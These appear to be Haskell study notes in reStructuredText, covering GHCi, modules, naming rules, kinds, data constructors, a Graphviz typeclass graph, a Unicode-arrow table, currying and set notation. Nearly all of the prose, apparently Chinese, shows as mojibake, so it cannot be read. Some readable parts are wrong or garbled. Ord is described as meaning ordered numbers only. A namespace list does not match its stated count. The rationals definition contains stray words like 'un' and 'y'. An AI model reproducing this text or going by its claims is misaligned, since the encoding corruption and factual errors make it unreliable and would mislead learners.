   ‰ΩøÁî® ``:load`` ÂëΩ‰ª§Âä†ËΩΩÊ∫ê‰ª£Á†ÅÊ®°ÂùóÔºåÊØîÂ¶Ç ``:load Main`` Âä†ËΩΩ Main.hs ÊàñËÄÖ Main.lhs„ÄÇ
   ËøêË°å GHCI_ ÂëΩ‰ª§Êó∂ÔºåÂèØ‰ª•‰ΩøÁî® -i ÈÄâÈ°πÊ∑ªÂä†Ê®°ÂùóÊâÄÂú®ÁöÑÁõÆÂΩï„ÄÇÂèØ‰ª•‰ΩøÁî® ``cabal repl`` ËøõÂÖ•
   ‰∫§‰∫íËß£ÈáäÂô®ÔºåÂÆÉ‰ºöÊèê‰æõÈ¢ùÂ§ñÁöÑÈÖçÁΩÆÔºå‰ª•‰ΩøÁî®‰æùËµñÂ∫ì„ÄÇ

   ÈÄöËøá Cabal ÊàñËÄÖ Stack Â∑•ÂÖ∑ÁÆ°ÁêÜÁöÑÊ®°ÂùóÈÄöÂ∏∏ÊòØÂä®ÊÄÅÂÖ±‰∫´Â∫ìÔºàshared librariesÔºâ„ÄÇ
   GHC ÁºñËØëÂô®Âú®ÁºñËØë‰ª£Á†ÅÊñá‰ª∂Êó∂ÁîüÊàêÁõÆÊ†áÊñá‰ª∂Ôºà.oÔºâÔºå‰∏é C ÁöÑÁõÆÊ†áÊñá‰ª∂ÂÆåÂÖ®Áõ∏Âêå„ÄÇ
   ËøòÊúâ‰∏Ä‰∏™Êé•Âè£Êñá‰ª∂Ôºà.hiÔºâÔºåÁõ∏ÂΩì‰∫é C ËØ≠Ë®ÄÁöÑÂ§¥Êñá‰ª∂ (.h)„ÄÇÊé•Âè£Êñá‰ª∂ÂåÖÂê´ÊúâÂÖ≥ .o Êñá‰ª∂ÁöÑ‰ø°ÊÅØÔºå
   ÊØîÂ¶ÇÂáΩÊï∞Á¨¶Âè∑Á≠âÁ≠â„ÄÇÁºñËØëÂÖ∂‰ªñ‰æùËµñËøô‰∏™Ê®°ÂùóÁöÑ‰ª£Á†ÅÊó∂ÔºåGHC Â∞±ÂèØ‰ª•Ê†πÊçÆËøô‰∫õ‰ø°ÊÅØËøõË°åÈìæÊé•„ÄÇ

   `Windows DLL`__ ÁõÆÂâç‰∏çÊîØÊåÅ„ÄÇ``ghc -c -dynamic M.hs`` ËøôÊ†∑ÁöÑÂëΩ‰ª§ÁºñËØëÁîüÊàêÂÖ±‰∫´Â∫ì‰ºöÊä•ÈîôÔºö

      Perhaps you haven't installed the "dyn" libraries for package ‚Äòbase-4.17.2.1

   .. _GHCI: https://downloads.haskell.org/ghc/latest/docs/users_guide/ghci.html
   .. _5.3 Import Declarations: https://www.haskell.org/onlinereport/haskell2010/haskellch5.html#x11-1010005.3
   .. _Windows DLL: https://gitlab.haskell.org/ghc/ghc/-/wikis/windows-dynamic-linking

   ÊåâÁÖß Haskell Language Report - Lexical Structure ÊèèËø∞ÔºåÈÄöËøá‰ª£Á†ÅÂ∏ÉÂ±ÄÔºàLayoutÔºâÔºå
   Âç≥‰ª£Á†ÅÁöÑÊ†ºÂºèÂØπÈΩêÔºåÂèØ‰ª•ÁúÅÁï•Ëä±Êã¨Âè∑ÂíåÂàÜÂè∑„ÄÇ

   The Haskell 2010 Language ÊñáÊ°£ÊâÄËø∞ÔºåÁ¨¶Âè∑ÂëΩÂêçÁ©∫Èó¥ÂàÜ‰∏∫ 6 Á±ªÔºåÊúâ‰∏§Êù°Á∫¶ÊùüÊù°‰ª∂Ôºö

   1. those for variables and constructors denote values; 
   2. those for type variables, type constructors,
   3. and type classes refer to entities related to the type system; 
   4. and module names refer to modules. 

   Ëøô 6 Á±ªÂëΩÂêçÂΩ¢ÂºèÂèØ‰ª•‰ΩøÁî®‰∏ãË°®ÂëàÁé∞Ôºö

      ====== ===== =================== ========================
      varid                                (variables)     
      conid                                (constructors)  
      tyvar  ‚Üí     varid                   (type variables)
      tycon  ‚Üí     conid                   (type constructors)
      tycls  ‚Üí     conid                   (type classes)
      modid  ‚Üí     {conid .} conid         (modules)
      ====== ===== =================== ========================

   ÂëΩÂêçÁ©∫Èó¥ÁöÑ‰∏§Êù°Á∫¶ÊùüÊù°‰ª∂ÊòØÔºö

   #. ÂèòÈáèÂêçÊàñÁ±ªÂûãÂèòÈáèÊ†áËØÜÁ¨¶Âè∑‰ΩøÁî®Â∞èÂÜôÂ≠óÊØçÊàñ‰∏ãÂàíÁ∫øÂºÄÂ§¥ÔºåÂÖ∂ÂÆÉÂõõÁ±ªÂêçÂ≠ó‰ΩøÁî®Â§ßÂÜôÂ≠óÊØçÂºÄÂ§¥Ôºõ
   #. ‰∏çËÉΩÂú®Âêå‰∏Ä‰∏™‰ΩúÁî®Âüü‰∏≠‰ΩøÁî®‰∏Ä‰∏™Ê†áËØÜÁ¨¶‰Ωú‰∏∫Á±ªÂûãÊûÑÈÄ†Âô®ÊàñÁ±ªÂêçÁß∞Ôºõ

   Haskell ËøòÊîØÊåÅ Unicode Á¨¶Âè∑ÔºåÊâÄ‰ª•ÔºåHaskell ‰∏≠ÁöÑÂèòÈáèÂèØ‰ª•‰ΩøÁî® var‚Äò ËøôÊ†∑ÁöÑÂêçÁß∞„ÄÇ
   ‰∏∫‰∫ÜÈÅøÂÖçÂëΩÂêçÂÜ≤Á™ÅÔºåÂ∫îËØ•Á¶ÅÊ≠¢‰ΩøÁî®‰ª•‰∏ã Haskell ‰øùÁïôÁöÑËøêÁÆóÁ¨¶Âè∑Ôºö
   ::

      :!#$%&*+./<=>?@\^| 

   Haskell ‰∏≠ÁöÑÂèòÈáèÊòØ‰∏çÂèØÂèòÁöÑÔºàImmutableÔºâÔºåÂ∞±ÂÉèÂëΩ‰ª§ÂºèËØ≠Ë®Ä‰∏≠ÁöÑÂ∏∏ÈáèÔºå‰ΩøÁî®ÁªëÂÆöÔºàbindingÔºâÊù•
   ÁªôÂèòÈáèËµãÂÄºÔºåÂõ†Ê≠§ = Âè∑Âú® Haskell ‰∏≠ÊÑèÂë≥ÁùÄÂ£∞Êòé‰∏Ä‰∏™ÂèòÈáèÁöÑÁªëÂÆöÔºåËÄåÈùûËµãÂÄº„ÄÇÂèòÈáè‰∏ÄÊó¶ÁªëÂÆö‰πãÂêéÔºå
   Â∞±‰∏çËÉΩÂÜçÁªëÂÆöÂÖ∂ÂÆÉÂÄº„ÄÇHaskell ÊòØÁºñÁ®ãËØ≠Ë®ÄÂèàÊòØÊï∞Â≠¶ËØ≠Ë®ÄÔºåÂÖ∂Á±ªÂûãÁ≥ªÁªü‰πü‰∏∫Êï∞Â≠¶ÊúçÂä°„ÄÇ

   ÂëΩ‰ª§ÂºèËØ≠Ë®ÄÔºå‰∏ÄËà¨‰∏äÊúâ‰∏ÄÂ•óÂÜÖÁΩÆÁöÑÁ±ªÂûãÔºå‰∏ÄËà¨‰∏≠ËÆ®ËÆ∫ÂèòÈáèÊàñÂ∏∏ÈáèÁöÑÁ±ªÂûã„ÄÇHaskell ËØ≠Ë®Ä‰∏≠Ôºå
   ‰∏ÄÂàáË°®ËææÂºèÈÉΩÂÖ∑ÊúâÂÆÉÊú¨Ë∫´ÁöÑÁ±ªÂûãÔºåÂç≥‰æøÊòØÂàóË°®ÔºåÂÆÉÂåÖÂê´ÁöÑÂÖÉÁ¥†‰∏çÂêåÔºåÂ∞±ÂÖ∑Êúâ‰∏çÂêåÁöÑÁ±ªÂûã„ÄÇ


   Á±ªÂûãÁêÜËÆ∫ÊúÄÊó©Áî±ÁΩóÁ¥†Âú®ÂÖ∂Êú¥Á¥†ÈõÜÂêàËÆ∫ÔºàNaive Set TheoryÔºâÂèëÁé∞ÁöÑÊÇñËÆ∫‰∏≠ÊºîÂåñËÄåÊù•„ÄÇ
   ÊûÑÈÄ†ÊÄßÁ±ªÂûãÁêÜËÆ∫ÔºàConstructive Type TheoryÔºâÂèàÁß∞‰∏∫Áõ¥ËßâÁ±ªÂûãÁêÜËÆ∫Ôºå‰∫é 1970s Âπ¥‰ª£Áî± 
   Per Martin-L√∂f ÂèëË°®„ÄÇ

   ÁÆÄÂçïÂú∞ËØ¥ÔºåÊûÑÈÄ†‰∏ª‰πâÁöÑÊ†∏ÂøÉÂ∞±ÊòØ ‚ÄúË¶ÅËØÅÊòé‰∏Ä‰∏™‰∏úË•øÂ≠òÂú®ÔºåÂøÖÈ°ªÊääÂÆÉÊûÑÈÄ†Âá∫Êù•‚Äù„ÄÇ
   Âú®ËÆ°ÁÆóÊú∫ÁßëÂ≠¶ÁºñÁ®ãËØ≠Ë®ÄÁêÜËÆ∫‰∏≠ÔºåÁ±ªÂûãËÆ∫Êèê‰æõ‰∫ÜËÆæËÆ°ÂàÜÊûêÂíåÁ†îÁ©∂Á±ªÂûãÁ≥ªÁªüÁöÑÂΩ¢ÂºèÂü∫Á°Ä„ÄÇ

   Haskell Âü∫‰∫éÁõ¥ËßâÁ±ªÂûãÁ≥ªÁªüÔºåGHCI_ Êèê‰æõ‰∫Ü ``:kind`` Âíå ``:type`` ‰∏§‰∏™ÂëΩ‰ª§Áî®‰∫éËé∑ÂèñÁ±ªÂûã‰ø°ÊÅØ„ÄÇ
   `Haskell's kind system - a primer <https://diogocastro.com/blog/2018/10/17/haskells-kind-system-a-primer/>`__

‰æãÂ¶Ç "hello" Âíå "world" ÈÉΩÂ±û‰∫é String Á±ªÂûãÔºåTrue Âíå False ÈÉΩÂ±û‰∫é Bool Á±ªÂûã„ÄÇÁõ∏‰ººÂú∞ÔºåString Á±ªÂûãÂíå Bool Á±ªÂûãÈÉΩÂ±û‰∫é *ÔºàËØª‰Ωú "star"Ôºâkind„ÄÇ

Ë°®ËææÂºè (values/terms) ÈÉΩÊúâÁ±ªÂûã (types)Ôºåtypes ‰πüÊúâËá™Â∑±ÂØπÂ∫îÁöÑ kinds„ÄÇ



   Haskell ËØ≠Ë®ÄÁöÑ ``data`` ÂÖ≥ÈîÆÂ≠óÂØπÂ∫îÊûÑÈÄ†Âô®ÔºàConstructorÔºâÔºåÂÆÉÂèØ‰ª•Êúâ‰∏§ÁßçÂê´‰πâÔºö

   *  `Type constructor <https://wiki.haskell.org/Constructor>`__
      ::

         -- An example of a nullary type constructor Bool with 
         -- two nullary data constructors True and False
         data Bool = True | False

         --  An example of a unary type constructor: Tree
         data Tree a = Tip | Node a (Tree a) (Tree a)

   *  Data constructor (or value constructor)
      -  Data constructors are not types
      -  Data constructors as first class values
      ::

         data Bool = True | False
         data Tree a = Tip | Node a (Tree a) (Tree a)

   Âç≥ÊûÑÈÄ†Êñ∞ÁöÑÁ±ªÂûãÔºåÊàñËÄÖÊûÑÈÄ†Êñ∞ÁöÑÂÄºÔºàÊï∞ÊçÆÂÄºÔºâ„ÄÇHaskell ËØ≠Ë®ÄÁöÑÁ±ªÂûãÁ≥ªÁªü‰∏é‰º†ÁªüÁöÑÂëΩ‰ª§ÂºèËØ≠Ë®ÄÊúâÂæàÂ§ßÁöÑ‰∏çÂêå„ÄÇ
   Haskell ÁºñÁ®ãÊ®°Âûã‰∏≠ÔºåÊûÑÈÄ†

   ‰ª•‰∏ãÊòØÊù•Ëá™ `Typeclassopedia <https://wiki.haskell.org/Typeclassopedia>`__
   ‰∏ÄÊñá‰∏≠ÁöÑÂÖ≥‰∫é Haskell Á±ªÂûãÂÖ≥Á≥ªÁöÑÈÖçÂõæÔºö

   .. figure:: ./pictures/haskell_typeclasses.svg

      ÂÖ≥Á≥ªÂõæ‰ΩøÁî® Graphviz ËÑöÊú¨ÂÆö‰πâÔºåÂèØ‰ª•‰ΩøÁî® dot -Tsvg ÂëΩ‰ª§ËΩ¨Êç¢‰∏∫ SVG ÂõæÂΩ¢Ê†ºÂºè„ÄÇ

      digraph {
        node [shape=box];
        Functor -> Applicative -> Monad;
        Apply -> Applicative;
        Semigroup -> Apply [constraint=false; style=dotted; arrowhead=none];
        Apply [color=grey];
        Applicative -> Alternative;
        Monad -> MonadPlus;
        Monad -> MonadFix;
        Semigroup -> Monoid;
        Monoid -> Applicative [constraint=false; style=dotted; arrowhead=none];
        Monoid -> Category [constraint=false; style=dotted; arrowhead=none];
        Monoid -> Alternative [style=dotted; arrowhead=none];
        Monoid -> MonadPlus [style=dotted; arrowhead=none];
        Category -> Arrow -> ArrowChoice;
        Arrow -> ArrowApply;
        Arrow -> ArrowLoop;
        Arrow -> ArrowZero -> ArrowPlus;
        {rank = same; Arrow; ArrowZero; ArrowPlus}
        Monoid -> ArrowPlus [style=dotted; arrowhead=none];
        Monad -> ArrowApply [style=bold, arrowhead=none];
        Monoid -> Foldable [style=dotted; arrowhead=none];
        Monoid -> Monad [style=dotted; arrowhead=none];
        Applicative -> Traversable [style=dotted; arrowhead=none];
        Foldable -> Traversable;
        Functor -> Traversable;
        Comonad [color=grey];
        Functor -> Comonad;
      }

   ‰ª§‰∫∫Âõ∞ÊÉëÁöÑ‚ÄúÁÆ≠Â§¥‚Äù‰ª¨Ôºö => -> <- <= Á≠âÁªÑÂêàÁ¨¶Âè∑Â≠óÈù¢‰∏äÈöêÂê´ÊúâÁÆ≠Â§¥Âê´‰πâÔºåÊ≠§Â§ñËøòÊúâ =<< & >=> & <=<„ÄÇ
   Âª∫ËÆÆ‰ΩøÁî® Fira Code Â≠ó‰ΩìÔºåËøô‰∫õÁªÑÂêàÁ¨¶Âè∑‰ºöÊòæÁ§∫‰∏∫ÂØπÂ∫îÁöÑÁÆ≠Â§¥Á¨¶Âè∑„ÄÇ ‰ª•‰∏ãÊòØ GHC ÁºñËØëÂô®ÊñáÊ°£ÊâÄÊîØÊåÅÁöÑ
   Unicode ÁÆ≠Â§¥Á¨¶Âè∑‰∏é ASCII ÁªÑÂêàÁ¨¶Âè∑ÁöÑÂØπÁÖßË°®Ôºö
   https://downloads.haskell.org/ghc/latest/docs/users_guide/exts/unicode_syntax.html

   =======  =======  ==========  ==============================
   ASCII    Unicode  Code point  Name
   =======  =======  ==========  ==============================
   ::       ‚à∑        0x2237       PROPORTION
   =>       ‚áí        0x21D2       RIGHTWARDS DOUBLE ARROW
   ->       ‚Üí        0x2192       RIGHTWARDS ARROW
   <-       ‚Üê        0x2190       LEFTWARDS ARROW
   >-       ‚§ö        0x291a       RIGHTWARDS ARROW-TAIL
   -<       ‚§ô        0x2919       LEFTWARDS ARROW-TAIL
   >>-      ‚§ú        0x291C       RIGHTWARDS DOUBLE ARROW-TAIL
   -<<      ‚§õ        0x291B       LEFTWARDS DOUBLE ARROW-TAIL
   *        ‚òÖ        0x2605       BLACK STAR
   forall   ‚àÄ        0x2200       FOR ALL
   (|       ‚¶á        0x2987       Z NOTATION LEFT IMAGE BRACKET
   |)       ‚¶à        0x2988       Z NOTATION RIGHT IMAGE BRACKET
   [|       ‚ü¶        0x27E6       MATHEMATICAL LEFT WHITE SQUARE BRACKET
   |]       ‚üß        0x27E7       MATHEMATICAL RIGHT WHITE SQUARE BRACKET
   %1->     ‚ä∏        0x22B8       MULTIMAP
   =======  =======  ==========  ==============================

   Haskell ÁöÑÂáΩÊï∞ÂÆö‰πâ‰∏≠‰ΩøÁî®‰∫ÜÂÖ∂‰∏≠Ââç‰∏§‰∏™Ôºö::

      <functionName> :: <paramType> -> ... -> <returnType>

      -- all :: Foldable t => (a -> Bool) -> t a -> Bool
      --                      ^~~~~~~~~~^: ÂáΩÊï∞‰ΩúÂèÇÊï∞
      -- odd :: Integral a => a -> Bool
      -- res2 = all odd [1,2,3,4] -- False

      -- max :: Ord a => a - > a - > a

   -  :: ‰πãÂêéÂÆö‰πâÂáΩÊï∞ÁöÑÂèÇÊï∞Á±ªÂûãÔºåÊØè‰∏™ÂèÇÊï∞ÈÉΩÂøÖÈ°ªÂÆö‰πâÁ±ªÂûãÔºõ
   -  Â§ö‰∏™ÂèÇÊï∞Á±ªÂûãÁî® -> È°∫Â∫èÈìæÊé•Ôºå-> ÈªòËÆ§‰∏∫Âè≥ÁªìÂêàÔºåËøô‰∏™Á¨¶Âè∑ÂèØ‰ª•ÂΩì‰Ωú -> (to) Á¨¶Âè∑ÁúãÂæÖÔºõ
   -  ÂáΩÊï∞ÔºöÂΩìÂáΩÊï∞‰Ωú‰∏∫ÂèÇÊï∞‰º†ÂÖ•Êó∂ÔºåËØ•ÂáΩÊï∞ÂèÇÊï∞Á±ªÂûãÂ£∞ÊòéÊ†ºÂºè‰∏çÂèòÔºå‰ΩÜÊï¥‰ΩìÁî®Â∞èÊã¨Âè∑ () ÂåÖÂõ¥Ôºõ
   -  ËøîÂõûÂÄºÁ±ªÂûãÔºöÊúÄÂêé‰∏Ä‰∏™Á±ªÂûãÁî®‰∫éÂÆö‰πâÂáΩÊï∞ËøîÂõûÂÄºÁöÑÁ±ªÂûãÔºõ

   -  => Ë°®Á§∫ÈÄªËæëÊé®ÂØº„ÄÇ
   -  -> Ë°®Á§∫ÂèòÈáè‰πãÈó¥ÁöÑËøûÊé•ÂÖ≥Á≥ª„ÄÇ
   -  <- Â∞±ÊòØÊääÊ≠§Á¨¶Âè∑Âè≥ËæπÁöÑËÆ°ÁÆóËØ≠Â¢É bind Âà∞Â∑¶ËæπÁöÑÂèòÈáè‰∏ä„ÄÇ
   -  <= ÂÖ∂ÂÆûÊòØÊØîËæÉËøêÁÆóÁ¨¶Âè∑„ÄÇ
   -  >>= Á≠âÂêå Rust ËØ≠Ë®ÄÁöÑ and_then ‰ªéÂè•ÔºåHaskell ËøòÂèØ‰ª•‰ΩøÁî® do ËØ≠Ê≥ïÁ≥ñÊù•Ë°®ËææÊ≠§Á¨¶Âè∑„ÄÇ

   Haskell ÁöÑÂáΩÊï∞‰∏•Ê†ºÊÑè‰πâ‰∏äÈÉΩÊòØÂçïÂèÇÊï∞ÂáΩÊï∞ÔºåÈÄöËøáÊüØÈáåÂåñÂÆûÁé∞Â§öÂèÇÊï∞ÂáΩÊï∞„ÄÇ
   ‰ΩøÁî® -> (to) ËÄå‰∏çÁî®ÂÖ∂‰ªñÁ¨¶Âè∑ÔºàÂ¶ÇÈÄóÂè∑ÔºâÂàÜÈöîÁöÑÂéüÂõ†‰πüÊòØÊüØÈáåÂåñ„ÄÇ

   ÊØîÂ¶Ç max ÂáΩÊï∞ÂÜôÊàê a -> a -> a ËÄå‰∏çÊòØ a a -> aÔºåÂú®Êï∞Â≠¶‰∏äÔºåcurry ÁöÑÊÑèÊÄùÊòØÔºö
   ÊâÄÊúâÂáΩÊï∞ÈÉΩËÉΩÂÆö‰πâ‰∏∫Âè™Êúâ‰∏Ä‰∏™ÂèÇÊï∞„ÄÇÂèØ‰ª•Êää max ÂáΩÊï∞ÁöÑÁ±ªÂûãÂΩìÂÅö a a -> a Êù•ÁêÜËß£Ôºå
   ‰πüÂ∞±ÊòØËæìÂÖ•‰∏§‰∏™ÂèÇÊï∞ÂæóÂà∞‰∏Ä‰∏™ÁªìÊûúÔºå‰ΩÜËøô‰∏çÊòØ curry„ÄÇcurry ÂåñÁöÑ max Á±ªÂûãÂ∫îËØ•ÊòØÔºö
   a -> (a -> a)ÔºåÂè™Êúâ‰∏Ä‰∏™ÂèÇÊï∞ÔºåÁªìÊûúÊòØ‰∏Ä‰∏™ÂáΩÊï∞ÔºåËøô‰∏™ÂáΩÊï∞‰πüÊòØ‰∏Ä‰∏™ÂèÇÊï∞‰∏Ä‰∏™ÁªìÊûú„ÄÇ
   ÂèÇÊï∞ÂºÄÂ§¥ÁöÑ Ord a Á∫¶Êùü‰∫ÜÂèÇÊï∞ a ÁöÑÁ±ªÂûãÊòØ Ord typeclassÔºåËøô‰∏™Á±ªÂûãË°®Á§∫ÊúâÂ∫èÁöÑÊï∞Â≠óÔºå
   ÂåÖÊã¨Êï¥Êï∞ÊàñÊµÆÁÇπÊï∞„ÄÇÂ¶ÇÊûúÊ≤°ÊúâËøô‰∏™Á±ªÂûãÂÆö‰πâÔºåa ÂèØ‰ª•ÊòØ‰ªª‰ΩïÁ±ªÂûã„ÄÇ

   Haskell ÁöÑÂáΩÊï∞ÂíåÊï∞Â≠¶ÁöÑÂáΩÊï∞ÂÆö‰πâÊúâÈ´òÂ∫¶ÁöÑ‰∏ÄËá¥ÊÄßÔºöÂáΩÊï∞Âç≥Êò†Â∞Ñ„ÄÇHaskell ‰∏≠ÂÆö‰πâÂáΩÊï∞Ôºå
   ÂèØ‰ª•‰∏∫‰∏çÂêåÁöÑÊò†Â∞ÑÊ®°ÂºèÔºàÂèÇÊï∞Â∑ÆÂºÇÔºâÂÆö‰πâÂáΩÊï∞‰Ωì„ÄÇÊØîÂ¶ÇÔºå‰ª•‰∏ãÂÆö‰πâ sayMe ÂáΩÊï∞ÂåÖÂê´‰∫Ü 6
   ‰∏™ÂáΩÊï∞‰ΩìÔºåÊò†Â∞Ñ‰∏çÂêåÁöÑÂèÇÊï∞ÂÄºÔºö

      .. code:: haskell:

         sayMe :: (Integral a) => a -> String
         sayMe 1 = "One!"
         sayMe 2 = "Two!"
         sayMe 3 = "Three!"
         sayMe 4 = "Four!"
         sayMe 5 = "Five!"
         sayMe x = "Not between 1 and 5"

   ÂèÇÊï∞ a ÂÆö‰πâ‰∏∫Êï¥ÂΩ¢ÔºàIntegralÔºâÔºåËøîÂõûÂÄºÊòØ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÔºåsayMe ÂáΩÊï∞Â∞±ÊòØÂÆÉ‰ª¨‰πãÈó¥ÂÖ≥Á≥ªÁöÑÊò†Â∞Ñ„ÄÇ

   ÂáΩÊï∞ÁöÑÊú¨Ë¥®ÊòØ‰∏ÄÁßçÊò†Â∞ÑÂÖ≥Á≥ªÔºå‰∏éÈõÜÂêà Sets Áõ∏ÂÖ≥„ÄÇÈÄö‰øóÂú∞ËÆ≤ÔºåÈõÜÂêàÂ∞±ÊòØ‰∏ÄÂ†ÜÁ°ÆÂÆöÁöÑÂÖÉÁ¥†/Áâ©‰Ωì„ÄÇÊØîÂ¶ÇÔºå
   Ê°åÈù¢‰∏äÊúâ‰∏§‰∏™‰∏çÂêåÈ¢úËâ≤ÁöÑËãπÊûúÔºåÂ¶ÇÊûúÂ∞Ü‚ÄúÊ°åÈù¢‰∏äÁöÑËãπÊûú‚ÄùÁúã‰Ωú‰∏Ä‰∏™ÈõÜÂêàÔºåÈÇ£‰πàËøô‰∏™ÈõÜÈõÜÂêàÁöÑÂÖÉÁ¥†Â∞±
   ‰∏§‰∏™‰∏çÂêåÈ¢úËâ≤ÁöÑÂπ≥Êûú„ÄÇÈÇ£‰πàÁî®Êï∞Â≠¶Á¨¶Âè∑Ë°®Á§∫‰∏∫Ôºö::

      ‚ÑÇ = { Á∫¢ËãπÊûú, ÈùíËãπÊûú }

   ÈõÜÂêàÔºåÁÆÄÁß∞ÈõÜÔºåÊòØÊï∞Â≠¶ÈõÜÂêàËÆ∫ÂàÜÊîØ‰∏≠ÁöÑ‰∏Ä‰∏™Âü∫Êú¨ÊäΩË±°Ê¶ÇÂøµÔºå‰πüÊòØÈõÜÂêàËÆ∫ÁöÑ‰∏ªË¶ÅÁ†îÁ©∂ÂØπË±°Ôºå‰ΩøÁî®ÂèåÁ∫øÂ≠óÊØçË°®Á§∫„ÄÇ
   Êï∞Â≠¶‰∏≠‰ΩøÁî® setÔºàÈõÜÂêàÔºâ‰∏é collectionÔºàÈõÜÊóèÔºâË°®Á§∫Âçï‰∏™ÈõÜÂêà‰∏éÂ§ö‰∏™ÈõÜÂêàÁöÑÁªìÊûÑÔºå‰ΩøÁî®Â§ßÂÜôÂ≠óÊØç
   CÔºàCollectionÔºâË°®Á§∫ÈõÜÂêàÊàñÈõÜÊóèÔºàÂÖ∂ÂÖÉÁ¥†‰∏∫ÈõÜÂêàÔºâÔºå‰ΩøÁî®Â∞èÂÜôÂ≠óÊØçË°®Á§∫ÂÖÉÁ¥†„ÄÇËÆ°ÁÆóÊú∫È¢ÜÂüüÂπ∂‰∏ç‰∏•Ê†ºÂå∫ÂàÜ
   ÈõÜÂêàÂíåÈõÜÊóè‰∏§ËÄÖÁöÑÂ∑ÆÂà´„ÄÇ

   ÈõÜÂêàËÆ∫ÁöÑÂü∫Êú¨ÁêÜËÆ∫ÂàõÁ´ã‰∫é 19 ‰∏ñÁ∫™ÔºåÊú¥Á¥†ÈõÜÂêàËÆ∫ÔºàIntuitive/Navie Sets TheoryÔºâÂÆö‰πâÔºö
   ÈõÜÂêàÂ∞±ÊòØ‚ÄúÁ°ÆÂÆöÁöÑ‰∏ÄÂ†Ü‰∏úË•ø‚ÄùÔºå‚Äú‰∏úË•ø‚ÄùÂç≥ÈõÜÂêà‰∏≠ÁöÑÂÖÉÁ¥†ÔºàElementsÔºâ„ÄÇÁé∞‰ª£‰∏ÄËà¨Â∞ÜÈõÜÂêàÂÆö‰πâ‰∏∫Ôºö
   Áî±‰∏Ä‰∏™ÊàñÂ§ö‰∏™Á°ÆÂÆöÁöÑÂÖÉÁ¥†ÊâÄÊûÑÊàêÁöÑÊï¥‰Ωì„ÄÇ

   ÈõÜÂêàÊúâ‰∏â‰∏™Âü∫Êú¨ÊÄßË¥®Ôºö

      *  ``Á°ÆÂÆöÊÄß``Ôºö‰ªªÁªô‰∏Ä‰∏™ÂÖÉÁ¥†ÔºåÂÆÉÂøÖÂ±û‰∫éÊàñËÄÖÂøÖ‰∏çÂ±û‰∫éËØ•ÈõÜÂêàÔºå‰∫åËÄÖÂøÖÂ±ÖÂÖ∂‰∏Ä„ÄÇ
      *  ``‰∫íÂºÇÊÄß``Ôºö‰∏Ä‰∏™ÈõÜÂêà‰∏≠Ôºå‰∏çÂ≠òÂú®Áõ∏ÂêåÁöÑÂÖÉÁ¥†„ÄÇÂèØ‰ª•‰ΩøÁî®Â§öÈáçÈõÜÔºåÂÖ∂‰∏≠ÁöÑÂÖÉÁ¥†ÂÖÅËÆ∏Âá∫Áé∞Â§öÊ¨°„ÄÇ
      *  ``Êó†Â∫èÊÄß``Ôºö‰∏Ä‰∏™ÈõÜÂêà‰∏≠ÔºåÊØè‰∏™ÂÖÉÁ¥†ÁöÑÂú∞‰ΩçÂØπÁ≠â‰∏îÊó†Â∫è„ÄÇ

   ÈõÜÂêàÊúâ‰∏âÁßçÂü∫Êú¨Ë°®Á§∫ÂΩ¢ÂºèÔºö

      *  ``Âàó‰∏æÊ≥ï``ÔºöÂú®Ëä±Êã¨Âè∑ { } ÂÜÖ‰∏Ä‰∏ÄÂàó‰∏æÈõÜÂêàÁöÑÊâÄÊúâÂÖÉÁ¥†ÔºåÊØîÂ¶Ç {1,2,3...}„ÄÇ
      *  ``ÊèèËø∞Ê≥ï``ÔºöÂú®Ëä±Êã¨Âè∑ { } ÂÜÖÂ∞ÜÈõÜÂêàÂÖÉÁ¥†ÁöÑÊÄßË¥®ÊèèËø∞Âá∫Êù•ÔºåÊØîÂ¶Ç {x | x > 0}„ÄÇ
      *  ``ÂõæÁ§∫Ê≥ï``Ôºö‰ΩøÁî®ÊñáÊ∞èÂõæÔºàVenn diagramÔºâÔºåÁî®Èó≠ÂêàÊõ≤Á∫øÂõ¥ÊàêÁöÑÂõæÂΩ¢Ë°®Á§∫‰∏Ä‰∏™ÈõÜÂêàÔºå

   ÈõÜÂêà‰∏≠‰ΩøÁî® | Á¨¶Âè∑Ë°®Á§∫‚ÄúÂ¶ÇÊ≠§‚Äù‚ÄúËøôÊ†∑‚ÄùÔºåÁî®‰∫éÊèèËø∞ÈõÜÂêàÁöÑÂÖÉÁ¥†„ÄÇ

   ‰ª•‰∏ãÊòØ‰∏Ä‰∫õÊ†áÂáÜÊï∞Â≠¶ÈõÜÂêàËÆ∞Âè∑ÔºàStandard NotationsÔºâÔºö

      - ‚àÖ Á©∫ÈõÜÔºåÊ≤°Êúâ‰ªª‰ΩïÂÖÉÁ¥†ÁöÑÈõÜÂêà„ÄÇ
      - ùïå ÈÄöÁî®ÈõÜÔºåUniversal SetÔºåÊâÄÊúâÂèØËÉΩÂÄºÁöÑÈõÜÂêà„ÄÇ
      - ‚Ñï :sub:`0`  = { 0,1,2,3,4, ... }
      - ‚Ñï :sub:`1` = { 1,2,3,4,5, ... }
      - ‚Ñ§  = {...- 3, -2, -1,0,1,2,3, ...}
      - ‚Ñö  = { x | x = un / b , un , b ‚àà ‚Ñ§ :sub:`y` b ‚â† 0 }
      - ‚Ñù  = { x | -‚àû < x < ‚àû }
      - ‚ÑÇ  = { z | z = a + bi , -‚àû < a <‚àû, -‚àû < b < ‚àû }

   ‰ª•‰∏ãÊòØ‰∏Ä‰∫õÂü∫Êú¨ÁöÑÈõÜÂêàËøêÁÆóÔºåÊ≥®ÊÑè ‚äÇ ‚äÉ Á¨¶Âè∑Â≠òÂú®ËØØÁî®ÔºåÂèØËÉΩ‰∫ßÁîüÊ≠ß‰πâÔºåÊúâ‰∫∫Áî® A ‚äÇ B Ë°®Á§∫ 
   A ÊòØ B ÁöÑÁúüÂ≠êÈõÜÔºåÊúâ‰∫∫Âàô‰ª•‰πãË°®Á§∫ A ÊòØ B ÁöÑÂ≠êÈõÜ„ÄÇ‰∏∫‰∫ÜÈÅøÂÖçÊ≠ß‰πâÔºå‰ΩøÁî®‰∏•Ê†ºÁ¨¶Âè∑Ë°®Á§∫‰∏çÁõ∏Á≠âÔºå
   ‰æãÂ¶Ç ‚´ã ‚ää „ÄÇ Áî® A ‚ää B ÊàñËÄÖ A ‚äÜ B ÂàÜÂà´Ë°®Á§∫ „ÄåAÊòØBÁöÑÁúüÂ≠êÈõÜÔºåAÊòØBÁöÑÂ≠êÈõÜ„ÄçÔºö

      -  A ‚ãÇ B    ‰∫§ÈõÜÔºàintersectionÔºâÔºåÁî±ÈÇ£‰∫õÂ±û‰∫é A ÂèàÂ±û‰∫é B ÁöÑÂÖÉÁ¥†ÊûÑÊàêÁöÑÈõÜÂêà„ÄÇ
